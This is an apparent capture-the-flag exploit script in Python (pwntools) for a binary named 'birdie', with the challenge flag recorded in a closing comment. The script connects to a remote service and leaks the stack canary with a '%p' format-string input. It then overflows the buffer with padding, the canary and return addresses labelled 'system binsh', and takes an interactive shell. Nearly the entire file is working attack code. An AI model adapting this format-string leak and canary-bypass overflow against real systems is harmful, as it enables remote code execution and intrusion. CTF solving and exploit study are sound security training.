#!/usr/bin/env python3

from pwn import *
from Crypto.Util.number import bytes_to_long
import binascii

host = '34.121.211.139'
port = 1111

r = remote(host, port)
# r = process('./birdie')
"""
r = gdb.debug('./birdie', '''
b *0x4007f3
#b *0x4007e2
#b *0x400831
b *0x400853
b *0x40085d
c
''')
"""

r.recvuntil('Enter your name\n')
name = '%p' * 0x10
r.sendline(name[:0x1f])
s = 'Enter the payload\n'
rec = r.recvuntil(s).split(b'0x')
print(rec)
canary = bytes_to_long(binascii.unhexlify(rec[-1][:16]))
log.success(f'canary = {hex(canary)}')

pld = b'A' * 72
pld += p64(canary)
pld += p64(0x400873) # system binsh
pld += p64(0x400873) # system binsh
pld += p64(0x400873) # system binsh
pld += p64(0x400873) # system binsh
pld += p64(0x400873) # system binsh

r.send(pld)
r.interactive()

"""
0x3275d8f98912bd00
0x2876f6767d582500

0x4007e2 main
0x400831 printf
"""

# shaktictf{c4tch1ng_th3_birdie_w4s_e4sy_pe4sy}
